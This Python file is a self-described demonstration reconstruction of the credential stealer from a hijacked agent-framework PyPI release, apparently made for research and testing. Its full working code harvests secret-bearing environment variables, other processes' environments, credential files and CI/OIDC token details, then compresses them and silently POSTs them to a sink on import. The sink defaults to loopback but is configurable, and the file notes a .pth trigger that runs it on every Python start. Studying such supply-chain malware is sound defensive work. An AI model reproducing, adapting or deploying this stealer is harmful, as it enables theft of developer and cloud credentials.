# ============================================================================
# DEMONSTRATION RECONSTRUCTION — NOT MALWARE — SBOB-Examples scenario A
# Reconstructed from public advisories (Wiz, OpenSourceMalware, Aikido,
# Socket; 2026-11-17 agent-framework PyPI hijack, version 1.26.2).
#
# The 1.26.2 evolution of the stealer, per the Wiz advisory:
#   - the malicious work moved out of agent_framework_meta into a TOP-LEVEL
#     module af_runtime_diag, fired by af_runtime_diag.pth on EVERY Python
#     start (no agent_framework import needed)
#   - the package's own agent_framework_meta/__init__.py was restored
#     byte-for-byte to its clean 1.26.0 content to hide the earlier change
#   - adds GitHub-Actions/CI env keys (ACTIONS, OIDC, RUNNER, ARM_) to the
#     collector and GitHub runner paths to the credential file list, with
#     the file cap raised to 80
#   - GitHub Actions OIDC token request shape included (audience
#     api://AzureADTokenExchange) — recorded here only, NEVER issued
#   - user-agent runtime-diagnostics/1 (1.26.1 used af-runtime-diagnostics/1)
#   - single zlib+base64 JSON POST to a hardcoded webhook, silent failure
#
# Same safety replacements as 1.26.1 (docs/TDS.md §4): loopback-only sink,
# synthetic fixture HOME/proc roots, metadata shapes recorded not issued,
# AF_TEST_NO_FORK for deterministic tests.
# ============================================================================
import base64
import json
import os
import sys
import threading
import time
import urllib.request
import zlib

_ENV_KEYS = (
    "TOKEN", "SECRET", "PASSWORD", "KEY", "AZURE", "AWS", "GITHUB",
    "OPENAI", "HF_", "FOUNDRY", "NPM", "PIP", "NUGET", "SYSTEM", "BUILD",
    "AGENT",
    # Added in 1.26.2 (GitHub Actions / CI focus):
    "ACTIONS", "OIDC", "RUNNER", "ARM_",
)
_MAX_PROC = 300
_MAX_FILES = 80  # raised from 60 in 1.26.1
_USER_AGENT = "runtime-diagnostics/1"  # changed from af-runtime-diagnostics/1
_GUARD_ENV = "_AF_TEL"

_CRED_FILES = (
    ".azure/azureProfile.json",
    ".azure/accessToken.json",
    ".npmrc",
    ".pip/pip.conf",
    "pip.conf",
    ".netrc",
    ".git-credentials",
    ".docker/config.json",
    ".cache/huggingface/token",
    ".azure-devops/agent/.credentials",
    ".env",
    "app/.env",
    "app/config.json",
    "app/settings.json",
    "workspace/.env",
    "workspace/config.json",
    "workspace/settings.json",
    # Added in 1.26.2: GitHub Actions runner paths (representative files from
    # the advisory's runner-path collection)
    "runner/work/_temp/gha_token",
    "runner/.azure/msi_token.json",
)

# Metadata endpoints: request shapes only. NEVER issued (safety boundary).
_METADATA_SHAPES = {
    "azure_devops_oidc": {
        "requires": ["SYSTEM_ACCESSTOKEN", "SYSTEM_OIDCREQUESTURI"],
        "audience": "api://AzureADTokenExchange",
    },
    "github_actions_oidc": {
        # 1.26.2 addition: GHA OIDC theft shape.
        "requires": ["ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
        "audience": "api://AzureADTokenExchange",
    },
    "imds_managed_identity": {
        "endpoint_shape": "http://169.254.169.254/metadata/oauth2/token",
        "resources": [
            "https://management.azure.com/",
            "https://graph.microsoft.com/",
            "https://vault.azure.net/",
            "https://storage.azure.com/",
            "https://cognitiveservices.azure.com/",
            "https://azureml.azure.com/",
            "https://search.azure.com/",
            "https://containerregistry.azure.com/",
            "https://app.vssps.visualstudio.com/",
            "499b84ac-1321-427f-aa17-267f5a2b4bb3",
            "https://database.azure.com/",
            "api://AzureADTokenExchange",
        ],
    },
    "instance_metadata": {
        "endpoint_shape": "http://169.254.169.254/metadata/instance",
    },
}


def _sink_url():
    # Original: hardcoded https://webhook[.]site/<uuid>?t=telemetry (defanged).
    # Demo: loopback-only sink; the real URL is never contacted.
    return os.environ.get("AF_SINK_URL", "http://127.0.0.1:8099/?t=telemetry")


def _collect_env():
    out = {}
    for key, value in os.environ.items():
        if any(marker in key for marker in _ENV_KEYS):
            out[key] = value
    return out


def _collect_proc_environ(root, limit=_MAX_PROC):
    out = {}
    try:
        pids = sorted(os.listdir(root))[:limit]
    except OSError:
        return out
    for pid in pids:
        try:
            with open(os.path.join(root, pid, "environ"), "rb") as fh:
                data = fh.read().decode("utf-8", "replace")
            env = {}
            for entry in data.split("\n"):
                if "=" in entry:
                    k, _, v = entry.partition("=")
                    if any(marker in k for marker in _ENV_KEYS):
                        env[k] = v
            if env:
                out[pid] = env
        except OSError:
            continue
    return out


def _collect_credential_files(home, limit=_MAX_FILES):
    out = {}
    if not home:
        sys.stderr.write(
            "demo-safety: AF_HOME not set; credential collection refused\n"
        )
        return out
    for rel in _CRED_FILES[:limit]:
        path = os.path.join(home, rel)
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                out[rel] = fh.read()[:4096]
        except OSError:
            continue
    return out


def _collect_metadata():
    out = {}
    for name, shape in _METADATA_SHAPES.items():
        present = [k for k in shape.get("requires", [])
                   if os.environ.get(k)]
        out[name] = dict(shape, triggers_present=present)
    return out


def _collect():
    home = os.environ.get("AF_HOME", "")
    proc_root = os.environ.get("AF_PROC_ROOT", "")
    if not home:
        sys.stderr.write(
            "demo-safety: AF_HOME not set; credential collection refused\n"
        )
    return {
        "collected_at": time.time(),
        "pid": os.getpid(),
        "env": _collect_env(),
        "proc_environ": _collect_proc_environ(proc_root),
        "credential_files": _collect_credential_files(home),
        "metadata": _collect_metadata(),
    }


def _stage(doc):
    return base64.b64encode(zlib.compress(json.dumps(doc).encode("utf-8")))


def _exfil(payload):
    request = urllib.request.Request(
        _sink_url(),
        data=payload,
        headers={"User-Agent": _USER_AGENT},
        method="POST",
    )
    urllib.request.urlopen(request, timeout=10)


def _run_once():
    try:
        payload = _stage(_collect())
        _exfil(payload)
    except Exception:
        pass


def _start():
    if os.environ.get(_GUARD_ENV) == "1":
        return
    os.environ[_GUARD_ENV] = "1"
    if os.environ.get("AF_TEST_NO_FORK") == "1":
        _run_once()
        return
    try:
        pid = os.fork()
    except (AttributeError, OSError):
        threading.Thread(target=_run_once, daemon=True).start()
        return
    if pid == 0:
        try:
            os.setsid()
        except OSError:
            pass
        _run_once()
        os._exit(0)


# Top-level call: runs on import, i.e. on EVERY Python start via the .pth.
_start()
